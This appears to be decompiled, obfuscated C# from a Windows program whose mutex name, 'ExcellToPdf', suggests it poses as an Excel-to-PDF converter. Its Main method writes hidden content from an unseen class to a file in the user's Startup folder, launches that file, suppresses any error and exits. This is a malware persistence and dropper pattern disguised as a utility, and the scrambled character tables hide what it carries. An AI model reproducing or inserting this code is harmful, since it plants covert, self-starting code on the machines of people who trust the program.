using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace ns0;

internal sealed class Class1
{
	internal sealed class Class2
	{
	}

	internal sealed class Class3
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 2860)]
		private struct Struct0
		{
		}

		private static readonly char[] char_0;

		private static readonly char[] char_1;

		private static readonly string[] string_0;

		internal static byte byte_0/* Not supported: data(00) */;

		static Class3()
		{
			char_1 = new char[1430];
			char[] array = new char[8];
			array[1] = '൶';
			array[4] = 'ᄜ';
			array[3] = '\u0603';
			array[7] = 'ἡ';
			array[0] = 'མ';
			array[6] = 'क';
			array[5] = '㓘';
			array[2] = '㡾';
			string_0 = new string[96];
			char_0 = array;
		}
	}

	internal sealed class Class4
	{
	}

	private static void Main(string[] args)
	{
		new Mutex(initiallyOwned: true, "ExcellToPdf", out var createdNew);
		if (createdNew)
		{
			Class0 @class = new Class0();
			@class.method_1();
			string text = @class.string_1 + @class.string_0 + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\oxu.txt";
			try
			{
				File.WriteAllLines(text, @class.string_2);
				Thread.Sleep(500);
				Process.Start(text);
			}
			catch
			{
			}
			Environment.Exit(0);
		}
	}
}
